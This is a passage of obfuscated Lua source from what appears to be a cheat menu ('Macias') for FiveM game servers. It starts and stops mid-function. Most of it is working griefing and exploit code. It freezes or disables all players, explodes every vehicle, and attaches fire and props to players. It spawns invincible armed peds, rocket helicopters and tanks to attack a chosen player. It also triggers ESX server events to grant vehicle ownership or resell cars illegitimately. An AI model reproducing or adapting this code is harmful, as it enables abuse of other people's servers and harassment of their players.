                                SetBlipScale(QQDEI165omK3[i], 0.85)
                                if IsPauseMenuActive() then
                                    SetBlipAlpha(QQDEI165omK3[i], 255)
                                else
                                    x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
                                    x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(W5eDh1a2r1deL[i]), true))
                                    distance =
                                        (math.floor(
                                        math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1
                                    )) + 900
                                    if distance < 0 then
                                        distance = 0
                                    elseif distance > 255 then
                                        distance = 255
                                    end
                                    SetBlipAlpha(QQDEI165omK3[i], distance)
                                end
                            end
                        end
                    end
                    QQDEI165omK3 = {}
                    Wait(0)
                end
            end
        )
    end
end
local v = true
local p_IC2 = nil
local Wa7v01BD86OJblB5aI = 5
MaciasFunc.spawnRandomTrain = function()
    if p_IC2 then
        DeleteMissionTrain(p_IC2)
        trainSpeed = 5
        print("Deleted train")
        p_IC2 = nil
        v = false
    else
        local gM = GetHashKey("cablecar")
        local EDIBxG1dx = GetHashKey("metrotrain")
        local pgSBFNHx2oKubf = GetHashKey("freight")
        local xLRD5jpGHQKXDBzRKT = GetHashKey("freightcar")
        local oTQvhjmand3rBuuk = GetHashKey("freightgrain")
        local paysd1RKZm_ay = GetHashKey("freightcont1")
        local sFdua = GetHashKey("freightcont2")
        local Zlvsut = GetHashKey("freighttrailer")
        RequestModel(gM)
        RequestModel(EDIBxG1dx)
        RequestModel(pgSBFNHx2oKubf)
        RequestModel(xLRD5jpGHQKXDBzRKT)
        RequestModel(oTQvhjmand3rBuuk)
        RequestModel(paysd1RKZm_ay)
        RequestModel(sFdua)
        RequestModel(Zlvsut)
        while (not HasModelLoaded(gM)) do
            Wait(0)
        end
        while (not HasModelLoaded(EDIBxG1dx)) do
            Wait(0)
        end
        while (not HasModelLoaded(pgSBFNHx2oKubf)) do
            Wait(0)
        end
        while (not HasModelLoaded(xLRD5jpGHQKXDBzRKT)) do
            Wait(0)
        end
        while (not HasModelLoaded(oTQvhjmand3rBuuk)) do
            Wait(0)
        end
        while (not HasModelLoaded(paysd1RKZm_ay)) do
            Wait(0)
        end
        while (not HasModelLoaded(sFdua)) do
            Wait(0)
        end
        while (not HasModelLoaded(Zlvsut)) do
            Wait(0)
        end
        local GcwU1GM43w = GetEntityCoords(PlayerPedId(), false)
        p_IC2 = CreateMissionTrain(24, GcwU1GM43w.x, GcwU1GM43w.y, GcwU1GM43w.z, 1)
        SetVehicleUndriveable(p_IC2, false)
        TaskWarpPedIntoVehicle(PlayerPedId(), p_IC2, -1)
        print("Spawned train")
        v = true
    end
    if v then
        if (GetVehiclePedIsIn(PlayerPedId(), false) == p_IC2) then
            local E52g6RugZxmYZC = "Train speed: ~b~" .. tostring(trainSpeed)
            print(E52g6RugZxmYZC)
            if (GetGameTimer() >= timer) then
                SetTrainSpeed(p_IC2, trainSpeed)
                timer = GetGameTimer() + 10
            end
            if (IsDisabledControlJustReleased(1, keyboard_keys["UP"])) then
                trainSpeed = trainSpeed + 0.1
                print("trainSpeed" .. trainSpeed)
            elseif (IsDisabledControlJustReleased(1, keyboard_keys["DOWN"])) then
                if (trainSpeed - 0.1 >= 0) then
                    trainSpeed = trainSpeed - 0.1
                end
                print("trainSpeed" .. trainSpeed)
            end
        end
    end
end
MaciasFunc.template = function()
    Citizen.CreateThread(
        function()
        end
    )
end
MaciasFunc.aPO = {}
MaciasFunc.aPO.template = function()
    local CWXHOgz2GM = GetActivePlayers()
    for i = 0, #CWXHOgz2GM do
    end
end
MaciasFunc.aPO.freezeAll = function()
    local Na9w2mxpQiA93RglEN38 = GetActivePlayers()
    for i = 0, #Na9w2mxpQiA93RglEN38 do
        ClearPedTasksImmediately(GetPlayerPed(i))
        ClearPedSecondaryTask(GetPlayerPed(i))
    end
end
MaciasFunc.aPO.disableDrivingCars = function()
    local WwRWsHCdbEKa = GetActivePlayers()
    for i = 0, #WwRWsHCdbEKa do
        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
            ClearPedTasksImmediately(GetPlayerPed(i))
        end
    end
end
MaciasFunc.aPO.noisyVehicles = function()
    for bo in EnumerateVehicles() do
        SetVehicleAlarmTimeLeft(bo, 60)
    end
end
MaciasFunc.aPO.explodeCars = function()
    for jpg1 in EnumerateVehicles() do
        if
            (jpg1 ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and
                (not GotTrailer or (GotTrailer and jpg1 ~= TrailerHandle))
         then
            RequestControlOnce(jpg1)
            NetworkExplodeVehicle(jpg1, true, true, false)
        end
    end
end
MaciasFunc.aPO.rapeVehicles = function()
    for M5lBiQvB2AjvkK2L8 in EnumerateVehicles() do
        MaciasFunc.sPO.rapeVehicle(M5lBiQvB2AjvkK2L8)
    end
end
MaciasFunc.aPO.beachFire = function()
    local QmIYqfv = GetActivePlayers()
    for i = 0, #QmIYqfv do
        MaciasFunc.sPO.beachFire(GetPlayerPed(QmIYqfv[i]))
    end
end
MaciasFunc.aPO.gasPump = function()
    local x_Yp = GetActivePlayers()
    for i = 0, #x_Yp do
        MaciasFunc.sPO.gasPump(GetPlayerPed(x_Yp[i]))
    end
end
MaciasFunc.aPO.clonePeds = function()
    local ZJnWd7XVG_NWzmwzV = GetActivePlayers()
    for i = 0, #ZJnWd7XVG_NWzmwzV do
        local fqnrs3zfdnB5br8PP91o = GetPlayerPedScriptIndex(GetPlayerPed(i))
        ClonePed(fqnrs3zfdnB5br8PP91o, 1, 1, 1)
    end
end
MaciasFunc.aPO.spawnTrollProp = function(zMgu30Qep2380)
    local tvKjaoOKv72F7guj0046 = GetActivePlayers()
    for i = 0, #tvKjaoOKv72F7guj0046 do
        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(i), zMgu30Qep2380)
    end
end
MaciasFunc.aPO.giveAllWeapons = function()
    for i = 0, #GetActivePlayers() do
        MaciasFunc.sPO.giveAllWeapons(GetPlayerPed(i))
    end
end
MaciasFunc.aPO.burnSFX = function()
    for trash = 0, 50 do
        for i = 0, #GetActivePlayers() do
            RequestNamedPtfxAsset("core")
            UseParticleFxAssetNextCall("core")
            StartNetworkedParticleFxNonLoopedOnEntity(
                "ent_sht_flame",
                GetPlayerPed(i),
                0,
                0,
                -0.5,
                0,
                0,
                0,
                5391.0,
                false,
                false,
                false
            )
        end
    end
end
MaciasFunc.sPO = {}
MaciasFunc.sPO.beachFire = function(Brztn3oICwizzchHn, SEi)
    local uvgOYYJo = GetHashKey("prop_beach_fire")
    RequestModel(uvgOYYJo)
    Citizen.CreateThread(
        function()
            local W5rHBekZtN9I7H1mICi = 0
            while not HasModelLoaded(uvgOYYJo) do
                W5rHBekZtN9I7H1mICi = W5rHBekZtN9I7H1mICi + 100.0
                Citizen.Wait(100.0)
                if W5rHBekZtN9I7H1mICi > 5000 then
                    Macias.PushNotification("Could not load model!", 5000)
                    break
                end
            end
            local __j, y85jjmvTrBdrJ9G, fLSnoci = table.unpack(GetEntityCoords(GetPlayerPed(Brztn3oICwizzchHn)))
            local qNzOgBuALR1M0oS = CreateObject(uvgOYYJo, __j, y85jjmvTrBdrJ9G, fLSnoci, true, true, false)
            AttachEntityToEntity(
                qNzOgBuALR1M0oS,
                Brztn3oICwizzchHn,
                GetPedBoneIndex(Brztn3oICwizzchHn, SKEL_Spine_Root),
                0,
                0,
                0,
                0,
                90,
                0,
                false,
                false,
                false,
                false,
                2,
                true
            )
        end
    )
end
MaciasFunc.sPO.gasPump = function(BTf6xmkcq, kfulYInyKM)
    local OZecaawzFsfKL = {-2007231801, 1339433404, 1694452750, 1933174915, -462817101, -469694731, -164877493}
    local gMMmSZh9q_8RL6aMCC = GetEntityCoords(BTf6xmkcq, false)
    for i = 1, #OZecaawzFsfKL do
        obj =
            CreateObject(
            OZecaawzFsfKL[i],
            gMMmSZh9q_8RL6aMCC.x,
            gMMmSZh9q_8RL6aMCC.y,
            gMMmSZh9q_8RL6aMCC.z,
            true,
            true,
            true
        )
        RequestControlOnce(obj)
        if DoesEntityExist(obj) then
            if kfulYInyKM then
                AttachEntityToEntity(
                    obj,
                    BTf6xmkcq,
                    GetPedBoneIndex(BTf6xmkcq, SKEL_Spine_Root),
                    0,
                    0,
                    0,
                    0,
                    90,
                    0,
                    false,
                    false,
                    false,
                    false,
                    2,
                    true
                )
            end
        end
    end
end
MaciasFunc.sPO.spectatePlayer = function(f9zSR)
    Uj8_cWbAGr6Q1NF4 = not Uj8_cWbAGr6Q1NF4
    local DitqZvIR = GetPlayerPed(f9zSR)
    if Uj8_cWbAGr6Q1NF4 then
        local bHA2ydupEHn9qPA_HbqqU, SB, Tl = table.unpack(GetEntityCoords(DitqZvIR, false))
        RequestCollisionAtCoord(bHA2ydupEHn9qPA_HbqqU, SB, Tl)
        NetworkSetInSpectatorMode(true, DitqZvIR)
        RequestCollisionAtCoord(GetEntityCoords(DitqZvIR))
        NetworkSetInSpectatorMode(true, DitqZvIR)
        MaciasFunc.Game.Subtitle("Started spectating ~b~" .. GetPlayerName(f9zSR))
    else
        local PgI0bp7pAL0c2, fweLaCYbjluC, dVIOAZQDX4 = table.unpack(GetEntityCoords(DitqZvIR, false))
        RequestCollisionAtCoord(PgI0bp7pAL0c2, fweLaCYbjluC, dVIOAZQDX4)
        NetworkSetInSpectatorMode(false, DitqZvIR)
        MaciasFunc.Game.Subtitle("Stopped spectating ~b~" .. GetPlayerName(f9zSR))
    end
end
MaciasFunc.sPO.teleportToPlayer = function(jq2XpuBTjXQwrkNXie2ZQ)
    SetEntityCoords(PlayerPedId(), GetEntityCoords(GetPlayerPed(jq2XpuBTjXQwrkNXie2ZQ)))
end
MaciasFunc.sPO.teleportIntoVehicle = function(UaGW_sOgX6b8JYh9)
    if not IsPedInAnyVehicle(UaGW_sOgX6b8JYh9) then
        return Macias.PushNotification("Player must be sitting in a vehicle!", 5000)
    end
    local BHAx6hBUvB1Qm2Th = GetVehiclePedIsUsing(UaGW_sOgX6b8JYh9)
    local ORr7 = GetVehicleMaxNumberOfPassengers(BHAx6hBUvB1Qm2Th)
    for i = 0, ORr7 do
        if IsVehicleSeatFree(BHAx6hBUvB1Qm2Th, i) then
            SetPedIntoVehicle(PlayerPedId(), BHAx6hBUvB1Qm2Th, i)
            break
        end
    end
end
MaciasFunc.sPO.SpawnVehicleToPlayer = function(C9sPHMhSK_n1Ed40, NcM)
    if C9sPHMhSK_n1Ed40 and IsModelValid(C9sPHMhSK_n1Ed40) and IsModelAVehicle(C9sPHMhSK_n1Ed40) then
        RequestModel(C9sPHMhSK_n1Ed40)
        while not HasModelLoaded(C9sPHMhSK_n1Ed40) do
            Citizen.Wait(0)
        end
        local YZG9P = (type(C9sPHMhSK_n1Ed40) == "number" and C9sPHMhSK_n1Ed40 or GetHashKey(C9sPHMhSK_n1Ed40))
        local EU0mAesm52c = GetPlayerPed(NcM)
        local sgGw7oHLEdPFUTOEhirH =
            CreateVehicle(YZG9P, GetEntityCoords(EU0mAesm52c), GetEntityHeading(EU0mAesm52c), true, true)
        local hiUFkSVO8DZD = NetworkGetNetworkIdFromEntity(sgGw7oHLEdPFUTOEhirH)
        SetNetworkIdCanMigrate(hiUFkSVO8DZD, true)
        SetEntityAsMissionEntity(sgGw7oHLEdPFUTOEhirH, true, false)
        SetVehicleHasBeenOwnedByPlayer(sgGw7oHLEdPFUTOEhirH, true)
        SetVehicleNeedsToBeHotwired(sgGw7oHLEdPFUTOEhirH, false)
        SetModelAsNoLongerNeeded(YZG9P)
        SetPedIntoVehicle(EU0mAesm52c, sgGw7oHLEdPFUTOEhirH, -1)
        SetVehicleEngineOn(sgGw7oHLEdPFUTOEhirH, true, false, false)
        SetVehRadioStation(sgGw7oHLEdPFUTOEhirH, "OFF")
        return sgGw7oHLEdPFUTOEhirH
    else
        Macias.PushNotification("Invalid Vehicle Model!", 5000)
        return nil
    end
end
MaciasFunc.sPO.SpawnLegalVehicle = function(GSH_, J436VYO1RFyh6cKgqQ, Wd)
    local WQrQ = MaciasFunc.sPO.SpawnVehicleToPlayer(GSH_, J436VYO1RFyh6cKgqQ)
    if WQrQ ~= nil then
        if string.IsNullOrEmpty(Wd) then
            SetVehicleNumberPlateText(WQrQ, GetVehicleNumberPlateText(WQrQ))
        else
            SetVehicleNumberPlateText(WQrQ, Wd)
        end
        Macias.PushNotification("Spawned Vehicle", 5000)
        local B_hoO = MaciasFunc.Game.GetVehicleProperties(WQrQ)
        local n9WsOG1O = GetDisplayNameFromVehicleModel(B_hoO.model)
        if B_hoO then
            if MaciasFunc.doesResourceExist("esx_vehicleshop") then
                TriggerMaciasEvent(
                    true,
                    "esx_vehicleshop:setVehicleOwnedPlayerId",
                    GetPlayerServerId(J436VYO1RFyh6cKgqQ),
                    B_hoO,
                    n9WsOG1O,
                    GSH_,
                    false
                )
            elseif MaciasFunc.doesResourceExist("esx_CryptosCustoms") then
                TriggerMaciasEvent(
                    true,
                    "esx_CryptosCustoms:setVehicleOwnedPlayerId",
                    GetPlayerServerId(J436VYO1RFyh6cKgqQ),
                    B_hoO,
                    n9WsOG1O,
                    GSH_,
                    false
                )
            else
                Macias.PushNotification("Resources were not found!", 5000)
            end
        end
    end
end
MaciasFunc.sPO.ESXSellVehicle = function()
    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
        if ESX ~= nil then
            local aiyeaJOss7N5s2 = MaciasFunc.Game.GetVehicleProperties(GetVehiclePedIsIn(GetPlayerPed(-1), false))
            if MaciasFunc.doesResourceExist("esx_vehicleshop") then
                ESX.TriggerServerCallback(
                    "esx_vehicleshop:resellVehicle",
                    function(r)
                    end,
                    aiyeaJOss7N5s2.plate,
                    aiyeaJOss7N5s2.model
                )
            elseif MaciasFunc.doesResourceExist("esx_CryptosCustoms") then
                ESX.TriggerServerCallback(
                    "esx_CryptosCustoms:resellVehicle",
                    function(VeU3V92268SnW3)
                    end,
                    aiyeaJOss7N5s2.plate,
                    aiyeaJOss7N5s2.model
                )
            else
                Macias.PushNotification("Resources were not found!", 5000)
            end
        else
            Macias.PushNotification("Couldn't find ESX, try refresing it in the settings tab", 5000)
        end
    else
        Macias.PushNotification("You must be in a vehicle to use this!", 5000)
    end
end
MaciasFunc.sPO.cloneVehicle = function(mRa6_bM0tSqXJ2yt)
    local eq_lR6utRHZ1ffxh6iw = nil
    if IsPedInAnyVehicle(GetPlayerPed(mRa6_bM0tSqXJ2yt)) then
        eq_lR6utRHZ1ffxh6iw = GetVehiclePedIsIn(GetPlayerPed(mRa6_bM0tSqXJ2yt), false)
    else
        eq_lR6utRHZ1ffxh6iw = GetVehiclePedIsIn(GetPlayerPed(mRa6_bM0tSqXJ2yt), true)
    end
    if DoesEntityExist(eq_lR6utRHZ1ffxh6iw) then
        local USVND95UyYwIQBA4agR1s = GetEntityModel(eq_lR6utRHZ1ffxh6iw)
        local x3eh8S_KNk0S3MDu = MaciasFunc.sPO.SpawnVehicleToPlayer(USVND95UyYwIQBA4agR1s, PlayerId())
        local q = MaciasFunc.Game.GetVehicleProperties(eq_lR6utRHZ1ffxh6iw)
        q.plate = nil
        MaciasFunc.Game.SetVehicleProperties(x3eh8S_KNk0S3MDu, q)
        SetVehicleEngineOn(x3eh8S_KNk0S3MDu, true, false, false)
        SetVehRadioStation(x3eh8S_KNk0S3MDu, "OFF")
    end
end
MaciasFunc.sPO.clonePedOutfit = function(ptlGFlhSz68Re76yaT, KrV_q4L)
    hat = GetPedPropIndex(KrV_q4L, 0)
    hat_texture = GetPedPropTextureIndex(KrV_q4L, 0)
    glasses = GetPedPropIndex(KrV_q4L, 1)
    glasses_texture = GetPedPropTextureIndex(KrV_q4L, 1)
    ear = GetPedPropIndex(KrV_q4L, 2)
    ear_texture = GetPedPropTextureIndex(KrV_q4L, 2)
    watch = GetPedPropIndex(KrV_q4L, 6)
    watch_texture = GetPedPropTextureIndex(KrV_q4L, 6)
    wrist = GetPedPropIndex(KrV_q4L, 7)
    wrist_texture = GetPedPropTextureIndex(KrV_q4L, 7)
    head_drawable = GetPedDrawableVariation(KrV_q4L, 0)
    head_palette = GetPedPaletteVariation(KrV_q4L, 0)
    head_texture = GetPedTextureVariation(KrV_q4L, 0)
    beard_drawable = GetPedDrawableVariation(KrV_q4L, 1)
    beard_palette = GetPedPaletteVariation(KrV_q4L, 1)
    beard_texture = GetPedTextureVariation(KrV_q4L, 1)
    hair_drawable = GetPedDrawableVariation(KrV_q4L, 2)
    hair_palette = GetPedPaletteVariation(KrV_q4L, 2)
    hair_texture = GetPedTextureVariation(KrV_q4L, 2)
    torso_drawable = GetPedDrawableVariation(KrV_q4L, 3)
    torso_palette = GetPedPaletteVariation(KrV_q4L, 3)
    torso_texture = GetPedTextureVariation(KrV_q4L, 3)
    legs_drawable = GetPedDrawableVariation(KrV_q4L, 4)
    legs_palette = GetPedPaletteVariation(KrV_q4L, 4)
    legs_texture = GetPedTextureVariation(KrV_q4L, 4)
    hands_drawable = GetPedDrawableVariation(KrV_q4L, 5)
    hands_palette = GetPedPaletteVariation(KrV_q4L, 5)
    hands_texture = GetPedTextureVariation(KrV_q4L, 5)
    foot_drawable = GetPedDrawableVariation(KrV_q4L, 6)
    foot_palette = GetPedPaletteVariation(KrV_q4L, 6)
    foot_texture = GetPedTextureVariation(KrV_q4L, 6)
    acc1_drawable = GetPedDrawableVariation(KrV_q4L, 7)
    acc1_palette = GetPedPaletteVariation(KrV_q4L, 7)
    acc1_texture = GetPedTextureVariation(KrV_q4L, 7)
    acc2_drawable = GetPedDrawableVariation(KrV_q4L, 8)
    acc2_palette = GetPedPaletteVariation(KrV_q4L, 8)
    acc2_texture = GetPedTextureVariation(KrV_q4L, 8)
    acc3_drawable = GetPedDrawableVariation(KrV_q4L, 9)
    acc3_palette = GetPedPaletteVariation(KrV_q4L, 9)
    acc3_texture = GetPedTextureVariation(KrV_q4L, 9)
    mask_drawable = GetPedDrawableVariation(KrV_q4L, 10)
    mask_palette = GetPedPaletteVariation(KrV_q4L, 10)
    mask_texture = GetPedTextureVariation(KrV_q4L, 10)
    aux_drawable = GetPedDrawableVariation(KrV_q4L, 11)
    aux_palette = GetPedPaletteVariation(KrV_q4L, 11)
    aux_texture = GetPedTextureVariation(KrV_q4L, 11)
    SetPedPropIndex(ptlGFlhSz68Re76yaT, 0, hat, hat_texture, 1)
    SetPedPropIndex(ptlGFlhSz68Re76yaT, 1, glasses, glasses_texture, 1)
    SetPedPropIndex(ptlGFlhSz68Re76yaT, 2, ear, ear_texture, 1)
    SetPedPropIndex(ptlGFlhSz68Re76yaT, 6, watch, watch_texture, 1)
    SetPedPropIndex(ptlGFlhSz68Re76yaT, 7, wrist, wrist_texture, 1)
    SetPedComponentVariation(ptlGFlhSz68Re76yaT, 0, head_drawable, head_texture, head_palette)
    SetPedComponentVariation(ptlGFlhSz68Re76yaT, 1, beard_drawable, beard_texture, beard_palette)
    SetPedComponentVariation(ptlGFlhSz68Re76yaT, 2, hair_drawable, hair_texture, hair_palette)
    SetPedComponentVariation(ptlGFlhSz68Re76yaT, 3, torso_drawable, torso_texture, torso_palette)
    SetPedComponentVariation(ptlGFlhSz68Re76yaT, 4, legs_drawable, legs_texture, legs_palette)
    SetPedComponentVariation(ptlGFlhSz68Re76yaT, 5, hands_drawable, hands_texture, hands_palette)
    SetPedComponentVariation(ptlGFlhSz68Re76yaT, 6, foot_drawable, foot_texture, foot_palette)
    SetPedComponentVariation(ptlGFlhSz68Re76yaT, 7, acc1_drawable, acc1_texture, acc1_palette)
    SetPedComponentVariation(ptlGFlhSz68Re76yaT, 8, acc2_drawable, acc2_texture, acc2_palette)
    SetPedComponentVariation(ptlGFlhSz68Re76yaT, 9, acc3_drawable, acc3_texture, acc3_palette)
    SetPedComponentVariation(ptlGFlhSz68Re76yaT, 10, mask_drawable, mask_texture, mask_palette)
    SetPedComponentVariation(ptlGFlhSz68Re76yaT, 11, aux_drawable, aux_texture, aux_palette)
end
MaciasFunc.sPO.spawnEnemies = function(rbYLdI3Z, qaYv)
    local y1J3 = "WEAPON_ASSAULTRIFLE"
    for i = 1, 5 do
        Citizen.CreateThread(
            function()
                local CChS7m0E5Jh04 = GetEntityCoords(rbYLdI3Z)
                RequestModel(GetHashKey(qaYv))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(qaYv)) then
                    local dnmHQlcbaVIPNujXC2 =
                        CreatePed(
                        21,
                        GetHashKey(qaYv),
                        CChS7m0E5Jh04.x + i,
                        CChS7m0E5Jh04.y - i,
                        CChS7m0E5Jh04.z,
                        0,
                        true,
                        true
                    ) and
                        CreatePed(
                            21,
                            GetHashKey(qaYv),
                            CChS7m0E5Jh04.x - i,
                            CChS7m0E5Jh04.y + i,
                            CChS7m0E5Jh04.z,
                            0,
                            true,
                            true
                        )
                    NetworkRegisterEntityAsNetworked(dnmHQlcbaVIPNujXC2)
                    if DoesEntityExist(dnmHQlcbaVIPNujXC2) and not IsEntityDead(rbYLdI3Z) then
                        local _3RWx6Cw5qWiwW56yBS = PedToNet(dnmHQlcbaVIPNujXC2)
                        NetworkSetNetworkIdDynamic(_3RWx6Cw5qWiwW56yBS, false)
                        SetNetworkIdCanMigrate(_3RWx6Cw5qWiwW56yBS, true)
                        SetNetworkIdExistsOnAllMachines(_3RWx6Cw5qWiwW56yBS, true)
                        Citizen.Wait(100.0)
                        NetToPed(_3RWx6Cw5qWiwW56yBS)
                        GiveWeaponToPed(dnmHQlcbaVIPNujXC2, GetHashKey(y1J3), 200, 1, 1)
                        SetEntityInvincible(dnmHQlcbaVIPNujXC2, true)
                        SetPedCanSwitchWeapon(dnmHQlcbaVIPNujXC2, true)
                        TaskCombatPed(dnmHQlcbaVIPNujXC2, rbYLdI3Z, 0, 16.0)
                    elseif IsEntityDead(rbYLdI3Z) then
                        TaskCombatHatedTargetsInArea(
                            dnmHQlcbaVIPNujXC2,
                            CChS7m0E5Jh04.x,
                            CChS7m0E5Jh04.y,
                            CChS7m0E5Jh04.z,
                            500
                        )
                    else
                        Citizen.Wait(0)
                    end
                end
            end
        )
    end
end
MaciasFunc.sPO.spawnHeliEnemies = function(XjyIwYVCDLScqxIiNzK)
    Citizen.CreateThread(
        function()
            local tPUp, P4o955zo4GQOwzAstME, jey5WE = table.unpack(GetEntityCoords(XjyIwYVCDLScqxIiNzK))
            local QqjAm = "buzzard"
            local LIlRsKM5 = "ig_claypain"
            RequestModelSync(QqjAm)
            RequestModelSync(LIlRsKM5)
            RequestModel(QqjAm)
            RequestModel(LIlRsKM5)
            local dO6LK = 0
            while not HasModelLoaded(LIlRsKM5) do
                dO6LK = dO6LK + 100.0
                Citizen.Wait(100.0)
                if dO6LK > 5000 then
                    Macias.PushNotification("Could not load model!", 5000)
                    break
                end
            end
            while not HasModelLoaded(QqjAm) do
                dO6LK = dO6LK + 100.0
                Citizen.Wait(100.0)
                if dO6LK > 5000 then
                    Macias.PushNotification("Could not load model!", 5000)
                    break
                end
            end
            local tsl5Kv9q_06sfoiEpQjd =
                CreateVehicle(
                GetHashKey(QqjAm),
                tPUp,
                P4o955zo4GQOwzAstME,
                jey5WE + 100.0,
                GetEntityHeading(XjyIwYVCDLScqxIiNzK),
                true,
                true
            )
            local Eg = CreatePedInsideVehicle(tsl5Kv9q_06sfoiEpQjd, 4, LIlRsKM5, -1, true, false)
            SetHeliBladesFullSpeed(tsl5Kv9q_06sfoiEpQjd)
            SetCurrentPedVehicleWeapon(Eg, GetHashKey("VEHICLE_WEAPON_PLANE_ROCKET"))
            SetVehicleShootAtTarget(Eg, XjyIwYVCDLScqxIiNzK, tPUp, P4o955zo4GQOwzAstME, jey5WE)
            local Qdxb3e = PedToNet(Eg)
            NetworkSetNetworkIdDynamic(Qdxb3e, false)
            SetNetworkIdCanMigrate(Qdxb3e, true)
            SetNetworkIdExistsOnAllMachines(Qdxb3e, true)
            Citizen.Wait(30)
            NetToPed(Qdxb3e)
            SetEntityInvincible(Qdxb3e, true)
            SetPedCanSwitchWeapon(Eg, true)
            TaskCombatPed(Eg, XjyIwYVCDLScqxIiNzK, 0, 16.0)
            local z7MliqrR6Nj = "a_m_y_skater_01"
            local YEk_e8ni03LNm = "WEAPON_ASSAULTRIFLE"
            for i = 1, 3 do
                local sTvBAA8UQ = GetEntityCoords(XjyIwYVCDLScqxIiNzK)
                RequestModel(GetHashKey(z7MliqrR6Nj))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(z7MliqrR6Nj)) then
                    local aYj_ZFpnMoUB = CreatePedInsideVehicle(tsl5Kv9q_06sfoiEpQjd, 4, LIlRsKM5, i, true, false)
                    NetworkRegisterEntityAsNetworked(aYj_ZFpnMoUB)
                    Citizen.CreateThread(
                        function()
                            if DoesEntityExist(aYj_ZFpnMoUB) and not IsEntityDead(XjyIwYVCDLScqxIiNzK) then
                                local rm3aVF = PedToNet(aYj_ZFpnMoUB)
                                NetworkSetNetworkIdDynamic(rm3aVF, false)
                                SetNetworkIdCanMigrate(rm3aVF, true)
                                SetNetworkIdExistsOnAllMachines(rm3aVF, true)
                                Citizen.Wait(100.0)
                                NetToPed(rm3aVF)
                                GiveWeaponToPed(aYj_ZFpnMoUB, GetHashKey(YEk_e8ni03LNm), 200, 1, 1)
                                SetEntityInvincible(aYj_ZFpnMoUB, true)
                                SetPedCanSwitchWeapon(aYj_ZFpnMoUB, true)
                                TaskCombatPed(aYj_ZFpnMoUB, XjyIwYVCDLScqxIiNzK, 0, 16.0)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    )
                end
            end
        end
    )
end
MaciasFunc.sPO.spawnTankEnemy = function(PbzJ)
    Citizen.CreateThread(
        function()
            local FOqtKS = "rhino"
            RequestModel(FOqtKS)
            while not HasModelLoaded(FOqtKS) do
                Citizen.Wait(50)
            end
            local ie2rMI = GetVehiclePedIsIn(PbzJ, false)
            local p36ENvuKJCRCgVji2c, S8qjanyyjO5D4t, JRDq9pc4X4yoQ3QF = table.unpack(GetEntityCoords(PbzJ))
            local uYWipsM82Rt1BsX =
                CreateVehicle(
                GetHashKey(FOqtKS),
                p36ENvuKJCRCgVji2c + 20,
                S8qjanyyjO5D4t + 20,
                JRDq9pc4X4yoQ3QF + 5,
                GetEntityCoords(PbzJ),
                true,
                false
            )
            RequestControlOnce(uYWipsM82Rt1BsX)
            local DPxGF8zZar = "s_m_y_swat_01"
            RequestModel(DPxGF8zZar)
            while not HasModelLoaded(DPxGF8zZar) do
                RequestModel(DPxGF8zZar)
                Citizen.Wait(50)
            end
            local d0Z9a4Pyc3FoBKwhsB_9l =
                CreatePedInsideVehicle(uYWipsM82Rt1BsX, 4, GetEntityModel(PlayerPedId()), -1, true, false)
            RequestControlOnce(d0Z9a4Pyc3FoBKwhsB_9l)
            SetDriverAbility(d0Z9a4Pyc3FoBKwhsB_9l, 10)
            SetDriverAggressiveness(d0Z9a4Pyc3FoBKwhsB_9l, 10)
            TaskCombatPed(d0Z9a4Pyc3FoBKwhsB_9l, PbzJ, 0, 16.0)
        end
    )
end
MaciasFunc.sPO.giveAllWeapons = function(D_U6Yj5JLO3D7m)
    for i = 1, #iys3AbTbrGHJF do
        GiveWeaponToPed(D_U6Yj5JLO3D7m, GetHashKey(iys3AbTbrGHJF[i]), 250.0, false, false)
    end
end
MaciasFunc.sPO.spawnPickupsOn = function(Np6J4b5WDlbs)
    CreatePickup(GetHashKey("PICKUP_WEAPON_COMPACTLAUNCHER"), GetEntityCoords(Np6J4b5WDlbs))
    CreatePickup(GetHashKey("PICKUP_WEAPON_RAYMINIGUN"), GetEntityCoords(Np6J4b5WDlbs))
    CreatePickup(GetHashKey("PICKUP_WEAPON_MINIGUN"), GetEntityCoords(Np6J4b5WDlbs))
    CreatePickup(GetHashKey("PICKUP_WEAPON_RAYPISTOL"), GetEntityCoords(Np6J4b5WDlbs))
end
MaciasFunc.sPO.ramVehicle = function(Lzj8Qvcpbx_zcMGWj2, izKCYV3WkvZR4)
    local IQ5crlIKs = GetHashKey(izKCYV3WkvZR4)
    RequestModel(IQ5crlIKs)
    while not HasModelLoaded(IQ5crlIKs) do
        Citizen.Wait(0)
    end
    local rsq5AuzngYtiQMJHICwK = GetOffsetFromEntityInWorldCoords(Lzj8Qvcpbx_zcMGWj2, 0, -10, 0)
    if HasModelLoaded(IQ5crlIKs) then
        local gVFEZnKbCrVK74Rqe =
            CreateVehicle(
            IQ5crlIKs,
            rsq5AuzngYtiQMJHICwK.x,
            rsq5AuzngYtiQMJHICwK.y,
            rsq5AuzngYtiQMJHICwK.z,
            GetEntityHeading(Lzj8Qvcpbx_zcMGWj2),
            true,
            true
        )
        SetVehicleForwardSpeed(gVFEZnKbCrVK74Rqe, 120.0)
    end
end
MaciasFunc.sPO.spawnTrollProp = function(K6PXdq, mZRdC)
    local IHSw5Ai_2GtH7BqYnd = GetHashKey(mZRdC)
    RequestModel(IHSw5Ai_2GtH7BqYnd)
    Citizen.CreateThread(
        function()
            local TNMi = 0
            while not HasModelLoaded(IHSw5Ai_2GtH7BqYnd) do
                TNMi = TNMi + 100.0
                Citizen.Wait(100.0)
                if TNMi > 5000 then
                    Macias.PushNotification("Could not load model!", 5000)
                    break
                end
            end
            local clMdV, Ia, D0dv3Ly_ciYz6i = table.unpack(GetEntityCoords(K6PXdq))
            local jWcMpNapeX = CreateObject(IHSw5Ai_2GtH7BqYnd, clMdV, Ia, D0dv3Ly_ciYz6i, true, true, false)
            AttachEntityToEntity(
                jWcMpNapeX,
                K6PXdq,
                GetPedBoneIndex(K6PXdq, SKEL_Spine_Root),
                0,
                0,
                0,
                0,
                90,
                0,
                false,
                false,
                false,
                false,
                2,
                true
            )
        end
    )
end
MaciasFunc.sPO.shootAt = function(shSkXOrKxuQs, dL_wQug)
